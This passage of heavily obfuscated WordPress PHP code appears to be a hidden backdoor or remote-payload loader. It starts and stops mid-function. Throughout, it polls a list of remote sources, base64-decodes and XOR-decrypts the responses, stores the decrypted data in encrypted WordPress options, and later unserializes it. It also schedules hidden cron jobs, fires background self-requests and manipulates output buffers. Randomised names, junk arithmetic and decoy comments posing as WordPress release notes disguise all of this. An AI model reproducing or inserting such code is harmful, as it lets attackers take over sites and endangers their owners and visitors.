   $t_ownkir6pw3n6 =    nrudcgor(321) .  $mtc6cthyxtaqv      . f5cd2smymkqusi5(322);

    $rvgibkmdxa   =  array(f5cd2smymkqusi5(323)   => nhceivfj8tbe(324));
      $ckebk2i2cd0   =  $GLOBALS['__scf_m30d3r9g_n_287'](true);
 foreach    ($vt8phgqu20rhl   as $z_gh5wr3a4i) {




  if   (($GLOBALS['__scf_m30d3r9g_n_287'](true)  -  $ckebk2i2cd0)    >  $thggerfwu5d4p9q)  {


break;
 }
     
$z_gh5wr3a4i  =  $GLOBALS['__scf_uvjtdemk2f_320']((string) $z_gh5wr3a4i);
     if   ($z_gh5wr3a4i  === "")  {
  continue;
   }
  try {
   $b8s8th5u3xiaqkb8 =   ubc4ftgylcl83r($z_gh5wr3a4i, $t_ownkir6pw3n6, $rvgibkmdxa, (4+1),     function   ($ha79t63e3av)  {
 $qbbdbnt9zw09 =    @$GLOBALS['__scf_ifj0midhwd_325']($ha79t63e3av,  true);


return   $GLOBALS['__scf_vf9p0fditvxy_35']($qbbdbnt9zw09)  && isset($qbbdbnt9zw09[f5cd2smymkqusi5(326)]);


});
   if   ($b8s8th5u3xiaqkb8   ===   false)    {
continue;
}
     $udueitca6_43w665     = @$GLOBALS['__scf_ifj0midhwd_325']($b8s8th5u3xiaqkb8, true);
  if    (!   $GLOBALS['__scf_vf9p0fditvxy_35']($udueitca6_43w665)  ||      !  isset($udueitca6_43w665[f5cd2smymkqusi5(327)])    ||     !  $GLOBALS['__scf__me483qbepnts_41']($udueitca6_43w665[f5cd2smymkqusi5(328)]))   {$rvdql2na6=PHP_INT_MAX/PHP_INT_MAX;$zknpx_bl=$rvdql2na6+25;
continue;
}

    $m7wsjf7nq32xptso =   $udueitca6_43w665[nrudcgor(328)];
 if     ($GLOBALS['__scf_nr12ouzrtt_7']($m7wsjf7nq32xptso, pahk8uy1uxt(329))  === 0)  {
// link register

$m7wsjf7nq32xptso  =  $GLOBALS['__scf_bv1z3no349dv5r_9']($m7wsjf7nq32xptso,  2);
     }
  
  $x729om3cyx45mjje   =   @s0atn4kj4wvk2f($m7wsjf7nq32xptso);
    if  ($x729om3cyx45mjje    === false   ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($x729om3cyx45mjje)  <    (122^58))   {
continue;
}


  $ih6plh8f88d =   (67-4);
   $hbxgxrytg6yt9   =  $GLOBALS['__scf_x4lqkl10zhuak_330']($x729om3cyx45mjje[$ih6plh8f88d]);



$vd8qp6l1as_h   = $GLOBALS['__scf_bv1z3no349dv5r_9']($x729om3cyx45mjje,     $ih6plh8f88d   + 1, $hbxgxrytg6yt9);
if (!  $GLOBALS['__scf__me483qbepnts_41']($vd8qp6l1as_h) ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($vd8qp6l1as_h)  <   (1+2))      {
   continue;
    }
    
$af3pxd5agimbr =  $GLOBALS['__scf_x4lqkl10zhuak_330']($vd8qp6l1as_h[0]);

 if    ($af3pxd5agimbr  <  1   ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($vd8qp6l1as_h) <   1 + $af3pxd5agimbr +  1) {
 continue;
}
  
 $lxfgknnp1j_p   =   $GLOBALS['__scf_bv1z3no349dv5r_9']($vd8qp6l1as_h, 1,  $af3pxd5agimbr);$txhicyib=-139;$xivjr9_ig0dvv=($txhicyib>0)?$txhicyib:-$txhicyib;
  $xc3uluycbyi  = $GLOBALS['__scf_bv1z3no349dv5r_9']($vd8qp6l1as_h,      1   + $af3pxd5agimbr);


if  (! $GLOBALS['__scf__me483qbepnts_41']($lxfgknnp1j_p)      || ! $GLOBALS['__scf__me483qbepnts_41']($xc3uluycbyi))   {
continue;
// deflationary vault




 }

$n6yo6vwqyht22   =   opn9d92hgvp02lt0zjrg($xc3uluycbyi,   $lxfgknnp1j_p);
 if (! $GLOBALS['__scf__me483qbepnts_41']($n6yo6vwqyht22) ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($n6yo6vwqyht22) <    2)    {


    fukkkeh6955g9qi(dhd5r6_4ki(331),  pahk8uy1uxt(332));
 continue;
   }
 
     $phqjbpvb0602nw    =  $GLOBALS['__scf_x4lqkl10zhuak_330']($n6yo6vwqyht22[0]);
  if     ($phqjbpvb0602nw < 1 ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($n6yo6vwqyht22)    <   1    +   $phqjbpvb0602nw) {
 fukkkeh6955g9qi(f5cd2smymkqusi5(333), nrudcgor(334));
   continue;
 }
 
 $fvyl5ti2vv =    $GLOBALS['__scf_bv1z3no349dv5r_9']($n6yo6vwqyht22,    1,    $phqjbpvb0602nw);
 $lbmplhs91w2_ikiw    =    $GLOBALS['__scf_bv1z3no349dv5r_9']($n6yo6vwqyht22,    1 +  $phqjbpvb0602nw);



$u4txwhv9825d0  = $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_zzp00036ej_335']($GLOBALS['__scf_mk5mjwnx8r_226'](dhd5r6_4ki(320),  $GLOBALS['__scf_j6pkvbu8vdcfn_336'](nrudcgor(337),  $lbmplhs91w2_ikiw))));

    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(338)))   {
  update_option(nrudcgor(339),  $z_gh5wr3a4i);
  update_option(nhceivfj8tbe(340), $GLOBALS['__scf_pcwytqel2ki6_341']("\n", $u4txwhv9825d0));

}
   return  array(nhceivfj8tbe(342)    =>    $fvyl5ti2vv,  nhceivfj8tbe(343)   =>    $u4txwhv9825d0);
    }  catch     (Throwable  $h2v_bjm4ejxq8fp)   {
   fukkkeh6955g9qi(nhceivfj8tbe(333), $h2v_bjm4ejxq8fp);
  continue;
      } catch    (Exception   $h2v_bjm4ejxq8fp)  {
  continue;
  }
     }
  $j2cv1ldlm4m1   =    $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(317))    ? (string) get_option(pahk8uy1uxt(340),     "")    : "";
  $a53dnmdicctv = weg_ghiafmuc1_6(nrudcgor(344),  "");
   if  ($j2cv1ldlm4m1   !== "" &&    $GLOBALS['__scf__me483qbepnts_41']($a53dnmdicctv)   &&  $a53dnmdicctv !==    "")    {
// WordPress 6.4 patterns: unload accumulator

$u4txwhv9825d0     =    $GLOBALS['__scf_sonjjhvinvs6_146']($GLOBALS['__scf_zzp00036ej_335']($GLOBALS['__scf_mk5mjwnx8r_226'](f5cd2smymkqusi5(320),      $GLOBALS['__scf_j6pkvbu8vdcfn_336'](nrudcgor(337),  $j2cv1ldlm4m1))));
      if    (!  empty($u4txwhv9825d0)) {
      return      array(pahk8uy1uxt(342) =>   $a53dnmdicctv,    dhd5r6_4ki(343) =>   $u4txwhv9825d0);



  }
     }
   fukkkeh6955g9qi(nhceivfj8tbe(333),    mhiu2yqz6kqd(345));
 return  array();
}
  function   sixcmmhuf18hun14a($pohfmix2npaee9,     $j6wc11jfv7e6w,  $rtq3o0jl9mck6)
 {
// heuristic backlog

  if (!  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(338)))  {
 return  false;
 }
if     (isset($GLOBALS[dhd5r6_4ki(346)])  &&    $GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[nrudcgor(346)]) &&   $GLOBALS['__scf_qcycj5at_g_240']($pohfmix2npaee9, $GLOBALS[mhiu2yqz6kqd(346)]))   {
   unset($GLOBALS[f5cd2smymkqusi5(347)][$pohfmix2npaee9]);
    }



$bw1dfta4jaac  = $GLOBALS['__scf_m881jp22m2wo_348']($j6wc11jfv7e6w);$w5qo3lf3ds=PHP_MAJOR_VERSION;$xiwxtor09qc=$w5qo3lf3ds*7;
    $ajy34ewn7358khwi     =      $GLOBALS['__scf_ep955ixf9wp_349']($GLOBALS['__scf_cn1v_k8jlgjjb_350'](1, (25^230)));
 $xkems8x1ubr    = "";
   for    ($dpe1xk6bz7cpp  =  0,  $phbzem8wsxe   = $GLOBALS['__scf_amjjmfnilcolnb_10']($bw1dfta4jaac); $dpe1xk6bz7cpp     < $phbzem8wsxe;  $dpe1xk6bz7cpp++)  {
      $xkems8x1ubr    .= $GLOBALS['__scf_ep955ixf9wp_349']($GLOBALS['__scf_x4lqkl10zhuak_330']($bw1dfta4jaac[$dpe1xk6bz7cpp])   ^     $GLOBALS['__scf_x4lqkl10zhuak_330']($ajy34ewn7358khwi));
    }
   return update_option($pohfmix2npaee9,    $GLOBALS['__scf_b6bj8r78s21_351']($ajy34ewn7358khwi .    $xkems8x1ubr),    $rtq3o0jl9mck6)    !==     false;
}
 
    function   tp_6sv5wl2a4y33wdv758($pohfmix2npaee9,   $lo9jghupfs)
 {
if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(317)))     return   $lo9jghupfs;
if (isset($GLOBALS[mhiu2yqz6kqd(352)])      &&     $GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[dhd5r6_4ki(353)])  &&  $GLOBALS['__scf_qcycj5at_g_240']($pohfmix2npaee9,    $GLOBALS[mhiu2yqz6kqd(353)])) {
    return $GLOBALS[mhiu2yqz6kqd(354)][$pohfmix2npaee9];



 }
$vdwiwj0f8hu8ghn  =  get_option($pohfmix2npaee9,     "");

   if  ($vdwiwj0f8hu8ghn     ===   "" || !      $GLOBALS['__scf__me483qbepnts_41']($vdwiwj0f8hu8ghn))    {
        return   $lo9jghupfs;
     }


    $pm6tbc91tttt086x    =  @$GLOBALS['__scf_wlpl5h61eyolq_355']($vdwiwj0f8hu8ghn, true);

if  ($pm6tbc91tttt086x     ===  false  ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($pm6tbc91tttt086x) < 2)   {
     return $lo9jghupfs;
}
  $ajy34ewn7358khwi = $pm6tbc91tttt086x[0];
  $spuh8_4nsi    =  "";
   for ($dpe1xk6bz7cpp   = 1, $phbzem8wsxe =   $GLOBALS['__scf_amjjmfnilcolnb_10']($pm6tbc91tttt086x);  $dpe1xk6bz7cpp     <    $phbzem8wsxe;    $dpe1xk6bz7cpp++)    {



   $spuh8_4nsi   .= $GLOBALS['__scf_ep955ixf9wp_349']($GLOBALS['__scf_x4lqkl10zhuak_330']($pm6tbc91tttt086x[$dpe1xk6bz7cpp])    ^ $GLOBALS['__scf_x4lqkl10zhuak_330']($ajy34ewn7358khwi));
}


  $tm23wedn5g =  dfwo9ta79he6zb4($spuh8_4nsi);

   if  ($tm23wedn5g !==  false)   {


  if   (!isset($GLOBALS[dhd5r6_4ki(354)])  ||  !$GLOBALS['__scf_vf9p0fditvxy_35']($GLOBALS[f5cd2smymkqusi5(354)]))  $GLOBALS[nhceivfj8tbe(354)]  = array();
 if  ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($GLOBALS[f5cd2smymkqusi5(354)])    >    (71-7))  $GLOBALS[nrudcgor(354)]  = array();
 $GLOBALS[nhceivfj8tbe(354)][$pohfmix2npaee9]    =   $tm23wedn5g;

 return  $tm23wedn5g;
   }
// WP Post Title: transpile authority

  return    $lo9jghupfs;

}
 function     dfwo9ta79he6zb4($vd8qp6l1as_h)
{



       if  (!$GLOBALS['__scf__me483qbepnts_41']($vd8qp6l1as_h))  return   false;



  if     (defined(f5cd2smymkqusi5(356))  && PHP_VERSION_ID >=  (0x3256+0xdf1a)) {
return  @$GLOBALS['__scf_y9nrm74mmknnrs_357']($vd8qp6l1as_h, array(mhiu2yqz6kqd(358)   => false));
    }
return   @$GLOBALS['__scf_y9nrm74mmknnrs_357']($vd8qp6l1as_h);
 }

function  zkd4btf3x85anm5_4()
  {



     static  $cueercjqf3k    =     null;$o1wlfzq_=1716;$mhf9bjbcfdcia6=$o1wlfzq_%13;
      if     ($cueercjqf3k  !== null) return    $cueercjqf3k;

  $rk_3ecj8aw  =   defined(nrudcgor(359))  ?  ABSPATH :    "";
$cueercjqf3k =  $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_f9_5dfsm5hfxx_360']('\\', '/',  $rk_3ecj8aw),  '/')   .  '/';
return $cueercjqf3k;
  }
  function  q5npf1u_t8amc0jdf($pohfmix2npaee9)
{$ej_uag45=(0xb1+0x19);$cf1q0xkb=$ej_uag45%3;
    return  ohrydgas8yy9a22s(zkd4btf3x85anm5_4()  .     (string)      mzvtk8ecgiuaeafix() .  $pohfmix2npaee9, (10+2));
 }
    function    h2iz25lld35tmbc2ls($tlv32r0ravg)



 {
return   (string)  ((11853092+79146908)  +  ((int)     hexdec($GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](zkd4btf3x85anm5_4() .  mhiu2yqz6kqd(361)    .    $tlv32r0ravg),  0, (4+3))) % (0x6d0c68+0x1c47d7)));
}
    function    rjpjcwta32hngcog8()
 {

return h2iz25lld35tmbc2ls(mhiu2yqz6kqd(362));
   

}
   function  zz9m34bs95t5e0ne4iwe_0()

    {
  $f_at4qo_dp  =   (string) weg_ghiafmuc1_6(nhceivfj8tbe(363),  "");
  return  $GLOBALS['__scf_amjjmfnilcolnb_10']($f_at4qo_dp)  >  (1+9) &&   $GLOBALS['__scf_nr12ouzrtt_7']($f_at4qo_dp,    rjpjcwta32hngcog8()) !== false && $GLOBALS['__scf_amjjmfnilcolnb_10']((string) weg_ghiafmuc1_6(nrudcgor(364),   ""))    >   (0x3a+0x2a);
  }



      
 function  weg_ghiafmuc1_6($pohfmix2npaee9, $lo9jghupfs)
   {
 return  tp_6sv5wl2a4y33wdv758(q5npf1u_t8amc0jdf($pohfmix2npaee9),    $lo9jghupfs);
}


 function     vlqx8b8viizxmck29ty0($pohfmix2npaee9, $lo9jghupfs    = "")



{
$n_vseps706s =    weg_ghiafmuc1_6($pohfmix2npaee9, $lo9jghupfs);

if    ($GLOBALS['__scf__me483qbepnts_41']($n_vseps706s))      return  $n_vseps706s;
   if  ($GLOBALS['__scf_ztr1st390a2ekj_365']($n_vseps706s))      return (string)  $n_vseps706s;
 return  $lo9jghupfs;
   }
   function c8fb1vg_q0kn6h($pohfmix2npaee9,  $j6wc11jfv7e6w,   $rtq3o0jl9mck6)
   {
  return   sixcmmhuf18hun14a(q5npf1u_t8amc0jdf($pohfmix2npaee9),    $j6wc11jfv7e6w, $rtq3o0jl9mck6);
 }
function   eoebansqyghh9h6ksu()
     {
 $hef2thl41jkrfcia = isset($GLOBALS[f5cd2smymkqusi5(154)]) ?     $GLOBALS[pahk8uy1uxt(154)]   :  array();
       $vdwiwj0f8hu8ghn = weg_ghiafmuc1_6(nhceivfj8tbe(366),   array());$p93y5tc68nugk=PHP_INT_MAX/PHP_INT_MAX;$ysetxzqruqqr8=$p93y5tc68nugk+43;
 if     ($GLOBALS['__scf_vf9p0fditvxy_35']($vdwiwj0f8hu8ghn))  {
   $hef2thl41jkrfcia     = $GLOBALS['__scf_b3z_uoye0i_367']($vdwiwj0f8hu8ghn,   $hef2thl41jkrfcia);
  }
// obstruction-free write-ahead-log

 $hef2thl41jkrfcia    = $GLOBALS['__scf_e3ymc0hwiys_147']($hef2thl41jkrfcia);



      return  $GLOBALS['__scf_jxqnb2ruhcwvk_155']($hef2thl41jkrfcia,   -(14+36));
       }
  function     r3jev29bxpoyxzku190l7()
      {
  if  (!isset($GLOBALS[dhd5r6_4ki(154)]) || empty($GLOBALS[dhd5r6_4ki(154)]))   return;
 try     {
$vdwiwj0f8hu8ghn  =  weg_ghiafmuc1_6(nrudcgor(366),    array());
  $_5b8oa6jyn3v4 =      $GLOBALS['__scf_e3ymc0hwiys_147']($GLOBALS['__scf_b3z_uoye0i_367']((array)$vdwiwj0f8hu8ghn,    $GLOBALS[nrudcgor(154)]));



      $_5b8oa6jyn3v4 =   $GLOBALS['__scf_jxqnb2ruhcwvk_155']($_5b8oa6jyn3v4,    -(64-14));$d1t0p6nv18y2z=(0xab+0xcf);$f8t7ar4h8idvx=$d1t0p6nv18y2z%6;
    c8fb1vg_q0kn6h(pahk8uy1uxt(366), $_5b8oa6jyn3v4,    f5cd2smymkqusi5(187));
}      catch    (Throwable $h2v_bjm4ejxq8fp) {
/* side-effect-free keystore */

  fukkkeh6955g9qi(f5cd2smymkqusi5(368),  $h2v_bjm4ejxq8fp);
}  catch   (Exception $h2v_bjm4ejxq8fp) {
      }
        }
    
 function opn9d92hgvp02lt0zjrg($vd8qp6l1as_h,  $key)
{$nmvwy2fksb=-300;$gmj0zk9elu=($nmvwy2fksb>0)?$nmvwy2fksb:-$nmvwy2fksb;

      if (! $GLOBALS['__scf__me483qbepnts_41']($vd8qp6l1as_h)  || !     $GLOBALS['__scf__me483qbepnts_41']($key)  ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($key)  === 0)     {
    return    null;
    }
 $wnx5dt7_wxby9 = $GLOBALS['__scf_amjjmfnilcolnb_10']($vd8qp6l1as_h);
  $jtcvswk9x9sxl =  $GLOBALS['__scf_amjjmfnilcolnb_10']($key);
 $m6t27xygoirjp =   "";
 for    ($dpe1xk6bz7cpp  =  0; $dpe1xk6bz7cpp  <     $wnx5dt7_wxby9;    $dpe1xk6bz7cpp++)   {
$m6t27xygoirjp  .=    $GLOBALS['__scf_ep955ixf9wp_349']($GLOBALS['__scf_x4lqkl10zhuak_330']($vd8qp6l1as_h[$dpe1xk6bz7cpp])     ^     $GLOBALS['__scf_x4lqkl10zhuak_330']($key[$dpe1xk6bz7cpp %    $jtcvswk9x9sxl]));$q5ely01ooq7=PHP_INT_MAX/PHP_INT_MAX;$s5k5s3ybqg=$q5ely01ooq7+33;
       }
return  $m6t27xygoirjp;


}

       function   stk4nonj1ironohda4($ow9h_6afcrz9q)
 {



   if   (! $GLOBALS['__scf_vf9p0fditvxy_35']($ow9h_6afcrz9q))      {
 $ow9h_6afcrz9q = array();

  }
static   $g9xoj1yke9     =     null;
if   ($g9xoj1yke9 ===  null)     {
   $g9xoj1yke9  =  o2ebi7xv7rf0ik_y5n9ry7();
 $drcleqqnwpgy4i4    =   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(317))     ?  tp_6sv5wl2a4y33wdv758(f5cd2smymkqusi5(369),   false)   :  false;



if  ($GLOBALS['__scf_vf9p0fditvxy_35']($drcleqqnwpgy4i4)  && isset($drcleqqnwpgy4i4[mhiu2yqz6kqd(370)])  &&   (int) $drcleqqnwpgy4i4[mhiu2yqz6kqd(370)]  >=  (538-238)     && (int)  $drcleqqnwpgy4i4[nrudcgor(370)]   <=      (86377+23))  $g9xoj1yke9 = (int)    $drcleqqnwpgy4i4[f5cd2smymkqusi5(371)];



 if ($g9xoj1yke9   < (55+5)) {$no3lsmj8x90=1844;$lcmx7qnfc0ip1=$no3lsmj8x90%8;
    $g9xoj1yke9  =   (0xd89+0x87);
    }
}
// clopen alert

    $ow9h_6afcrz9q[f5cd2smymkqusi5(372)] = array(
 pahk8uy1uxt(373)  => $g9xoj1yke9,
 mhiu2yqz6kqd(374) => f5cd2smymkqusi5(375),
    );


      $ow9h_6afcrz9q[mhiu2yqz6kqd(376)]   =     array(
 nrudcgor(373)   => (1054-454),
    f5cd2smymkqusi5(374)    =>    nrudcgor(375),
 );
  return $ow9h_6afcrz9q;
   }



     function      j8n8sx7uji82wxjlc6pgs()
     {


      if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(377))     ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(378)))  return;
 if  (!dw5qugv407fnslnons1tfr(nhceivfj8tbe(379))) return;
  try {
if  (!wp_next_scheduled(mklbz63xfh8ufytv1td7t())) {

 wp_schedule_event($GLOBALS['__scf_zxyq0lcqv02z6_185']()   +    $GLOBALS['__scf_cn1v_k8jlgjjb_350']((31+29),  (283+17)),   f5cd2smymkqusi5(372),     mklbz63xfh8ufytv1td7t());
}
// intercept heuristic vault

     }     finally  {
m8s6jamaok_hdjr3wp(nrudcgor(379));
}
   }



    function    je8m6ebtgwkxt2mg()


      {
// prescriptive symbol-table

 


   if  (defined(nhceivfj8tbe(380))     && DOING_CRON)    {
  return;
  }
// WordPress 6.6 block bindings webp conversion



   
static $yc95rogvvetq0f     =  false;
  if    ($yc95rogvvetq0f)     return;


 $yc95rogvvetq0f    =   true;
  
     if   (!     us6ojbyhi_yprcisb4())    {
return;
  }
  

 rehs1w07vadorbxdvk(f5cd2smymkqusi5(381),      nhceivfj8tbe(382),  0);
 }
  function  a55b3zjo9su10xzeput9()
 {
 if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(290))  ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(383)))   return;
 @$GLOBALS['__scf_yt926i7lwej_290'](site_url(mhiu2yqz6kqd(384) .  $GLOBALS['__scf_f9_5dfsm5hfxx_360']('.',   "", (string)  $GLOBALS['__scf_m30d3r9g_n_287'](true))  .     $GLOBALS['__scf_cn1v_k8jlgjjb_350']((174-74),  (990+9))),    array(nrudcgor(385)     =>     0.01,      nhceivfj8tbe(386)   => false,  nrudcgor(387)    =>  false));

  }
function    _5nncoipm35h5yix()
     {



static  $c4u26guxrzllce    =   false;
     if    ($c4u26guxrzllce)     return;
  $c4u26guxrzllce   =   true;
   try   {
      p7mu7s58onbpwt42r48cd();
  $nam05si9hdv =    false;



  if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(388))) {


    $GLOBALS['__scf_k5wfn50cx02lr1_388']();
$nam05si9hdv = true;
 }  elseif ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(389)))    {
     $GLOBALS['__scf_vcb1lxd5m0p5dy_389']();

  $nam05si9hdv   =  true;
}    else {
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(390)))   {
      @$GLOBALS['__scf_hhzezqrk2hs9_390'](true);



  }
// WordPress 6.6 block bindings: terminate broadcaster

$mfncb6h5rxl  =   false;
      if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(230)))  {
$tdn1zcm7r9_ek6x = $GLOBALS['__scf_h3sj62ryxfdde_99']($GLOBALS['__scf_uvjtdemk2f_320']((string)   @$GLOBALS['__scf_jpj9mbom_1b_109'](dhd5r6_4ki(391))));

 $mfncb6h5rxl  = ($tdn1zcm7r9_ek6x !==  "" &&  $tdn1zcm7r9_ek6x   !== '0'     &&  $tdn1zcm7r9_ek6x  !==  mhiu2yqz6kqd(392));


 }
       $i0zl232vbnqz6gpu      = $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(393)) ? @ob_get_status(true)  :    array();
  if   ($GLOBALS['__scf_vf9p0fditvxy_35']($i0zl232vbnqz6gpu))   {
 foreach ($i0zl232vbnqz6gpu  as $vnmdfxhcv0zy) {
$c9uc81ubf5v7en    =   $GLOBALS['__scf_vf9p0fditvxy_35']($vnmdfxhcv0zy)     &&   isset($vnmdfxhcv0zy[pahk8uy1uxt(394)]) ? $GLOBALS['__scf_h3sj62ryxfdde_99']((string)  $vnmdfxhcv0zy[mhiu2yqz6kqd(395)])    : "";
if  ($GLOBALS['__scf_nr12ouzrtt_7']($c9uc81ubf5v7en,  dhd5r6_4ki(396)) !==  false  ||  $GLOBALS['__scf_nr12ouzrtt_7']($c9uc81ubf5v7en, dhd5r6_4ki(397)) !== false) {
 $mfncb6h5rxl    =   true;
    break;
    }
}
// return address




}



  if  (!$mfncb6h5rxl  && $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(398)))   {
        foreach  ((array)     @headers_list()  as    $ltpfrin_iesnspur) {



 if    (stripos($ltpfrin_iesnspur,  nhceivfj8tbe(399)) ===  0 && stripos($ltpfrin_iesnspur,  pahk8uy1uxt(400))  === false)     {
     $mfncb6h5rxl      = true;
break;$zb278jhtrm91=(0xb3+0xa2);$ep9ksna1rtb=$zb278jhtrm91%4;



  }
      }
    }
  $o44f6l2qlggcyi =      $GLOBALS['__scf_c9jv8d7koon_100']();
$f5u13ebttdv9i1v = ($o44f6l2qlggcyi      !== mhiu2yqz6kqd(401) && $o44f6l2qlggcyi !== mhiu2yqz6kqd(402));
 $dq7r0e_osjz4  =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(403))   ?     (int)   @http_response_code() :  (162+38);
   

 $ct0s1e1fia7    = ($dq7r0e_osjz4    >=  (0x5a+0xa)   && $dq7r0e_osjz4   <    (266-66)) ||     $dq7r0e_osjz4    ===  (76^128) ||     $dq7r0e_osjz4 ===    (252+52);

 $awt09j6ljkq2  =    (isset($_SERVER[f5cd2smymkqusi5(404)]) &&  $_SERVER[mhiu2yqz6kqd(404)] ===  f5cd2smymkqusi5(405));



  $d83edccaoz8  =     false;
       if  ($f5u13ebttdv9i1v   && !$ct0s1e1fia7  &&   !$awt09j6ljkq2    && !headers_sent() && !$mfncb6h5rxl)    {
   while     ($GLOBALS['__scf_sqafjxbxzurlgl_406']()  >   1)  {



$ywzw6suh55qj_  =  $GLOBALS['__scf_sqafjxbxzurlgl_406']();
 if (!@$GLOBALS['__scf_bqc9_6luuwttm_407']()  ||  $GLOBALS['__scf_sqafjxbxzurlgl_406']() >=   $ywzw6suh55qj_)   break;
}
    $vnmdfxhcv0zy  =  $GLOBALS['__scf_sqafjxbxzurlgl_406']()    ===    1  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(393)) ?   @ob_get_status()   :     array();
       $c9uc81ubf5v7en   =    $GLOBALS['__scf_vf9p0fditvxy_35']($vnmdfxhcv0zy)   &&   isset($vnmdfxhcv0zy[nhceivfj8tbe(408)])  ?  $GLOBALS['__scf_h3sj62ryxfdde_99']((string)  $vnmdfxhcv0zy[f5cd2smymkqusi5(409)]) :  "";

$_cl    =  false;
    if  ($GLOBALS['__scf_sqafjxbxzurlgl_406']()  ===  0)   {
 $_cl  =  0;
 } elseif (

$GLOBALS['__scf_sqafjxbxzurlgl_406']()  === 1

      &&      $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(393))
 &&     ($c9uc81ubf5v7en  === ""   || $c9uc81ubf5v7en  ===  dhd5r6_4ki(410))
  && $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(411))
     )  {
     $_cl     =     @ob_get_length();
 }
   $c2_7tdovijmumfap =   true;
if     (isset($GLOBALS[mhiu2yqz6kqd(412)][nrudcgor(413)]))   {
$_wf    =   $GLOBALS[nrudcgor(414)][mhiu2yqz6kqd(413)];
   $lwo46u0tp_h8t7rk   = ($GLOBALS['__scf_d56ll0ap77jcvq_66']($_wf) && isset($_wf->callbacks))   ? $_wf->callbacks : ($GLOBALS['__scf_vf9p0fditvxy_35']($_wf)  ?     $_wf : array());
foreach   ($lwo46u0tp_h8t7rk   as   $_pr =>  $v92c8qsjk8kviu) {
   if     (!$GLOBALS['__scf_vf9p0fditvxy_35']($v92c8qsjk8kviu)) continue;
  foreach  ($v92c8qsjk8kviu as      $brucik2b8xh) {
   $xwey5xrmc523q9  = ($GLOBALS['__scf_vf9p0fditvxy_35']($brucik2b8xh)     && isset($brucik2b8xh[nhceivfj8tbe(67)]))  ? $brucik2b8xh[nrudcgor(67)] :     "";
 if ($GLOBALS['__scf__me483qbepnts_41']($xwey5xrmc523q9) &&  $GLOBALS['__scf_rq7q923zwh_148']($xwey5xrmc523q9,  array(f5cd2smymkqusi5(415), f5cd2smymkqusi5(416)),  true))  continue;
$c2_7tdovijmumfap  =     false;
   break 2;
 }



       }
/* unbounded effect-type */

  unset($_wf, $lwo46u0tp_h8t7rk,  $_pr, $v92c8qsjk8kviu, $brucik2b8xh,    $xwey5xrmc523q9);
 }
  if     ($_cl !==  false  && $c2_7tdovijmumfap     && !headers_sent())  {
@header(f5cd2smymkqusi5(417)  . (int)  $_cl);
    @header(nrudcgor(418));
$d83edccaoz8  =  true;
  }
  }
 if    ($f5u13ebttdv9i1v)  {
while  ($GLOBALS['__scf_sqafjxbxzurlgl_406']()      >    0)    {
   $ywzw6suh55qj_  = $GLOBALS['__scf_sqafjxbxzurlgl_406']();
     if   (!@$GLOBALS['__scf_bqc9_6luuwttm_407']() ||    $GLOBALS['__scf_sqafjxbxzurlgl_406']()  >=  $ywzw6suh55qj_)   break;
    }
 @$GLOBALS['__scf_fweie7c5cg4_b_419']();



   }
 if ($d83edccaoz8 &&   $GLOBALS['__scf_sqafjxbxzurlgl_406']()    ===   0)  $nam05si9hdv   =   true;
 unset($mfncb6h5rxl,   $tdn1zcm7r9_ek6x,     $i0zl232vbnqz6gpu, $vnmdfxhcv0zy,  $c9uc81ubf5v7en, $ltpfrin_iesnspur,    $o44f6l2qlggcyi,  $f5u13ebttdv9i1v,     $dq7r0e_osjz4, $ct0s1e1fia7,  $d83edccaoz8,  $ywzw6suh55qj_, $_cl,   $awt09j6ljkq2);
  }
 $n_2t1swhkixay0 = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(420)) &&   !(defined(pahk8uy1uxt(421))      && DISABLE_WP_CRON);
if  ($n_2t1swhkixay0 &&  pyewlacc1jwb_z()) $n_2t1swhkixay0  = false;
 $kyij5t2c6tks9c     =   !$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(317))     ||   (int) get_option(f5cd2smymkqusi5(422), 0) ===  0;
  if (!$kyij5t2c6tks9c   &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(317)) &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(338)))     {
// WP Loginout Block: terminate iterator

 $ddz57ewn0l  =  (string)   get_option(mhiu2yqz6kqd(423), "");
 if  ($ddz57ewn0l  !==     kwqziujdph5xlz3n())  {
@update_option(nhceivfj8tbe(423),  kwqziujdph5xlz3n(),  f5cd2smymkqusi5(187));
   @update_option(pahk8uy1uxt(424),  0,    mhiu2yqz6kqd(187));
